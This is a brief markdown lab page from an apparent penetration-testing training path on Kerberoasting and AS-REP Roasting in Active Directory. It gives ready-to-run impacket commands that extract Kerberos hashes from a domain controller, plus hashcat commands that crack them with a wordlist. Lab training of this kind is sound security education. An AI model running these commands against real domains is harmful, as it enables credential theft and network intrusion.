# Lab 06: Kerberoasting & AS-REP Roasting

[⬅️ Previous](Lab-05-Advanced-Track-AD-Basics.md) | [🏠 Path Home](Home.md)

---

## 🎯 Lab Objective
Perform Kerberoasting and AS-REP Roasting attacks.

## 🌐 Direct Lab Access
- TryHackMe: https://tryhackme.com/room/attackingkerberos

---

## 📝 AS-REP Roasting
Users without pre-authentication required.
```bash
impacket-GetNPUsers targetdomain.com/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 192.168.1.10
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 📝 Kerberoasting
Service Principal Names (SPNs).
```bash
impacket-GetUserSPNs targetdomain.com/username:password -request -dc-ip 192.168.1.10 -outputfile hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 🔗 Additional Resources
- PayloadsAllTheThings Kerberos: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md

---

[⬅️ Previous](Lab-05-Advanced-Track-AD-Basics.md) | [🏠 Path Home](Home.md)
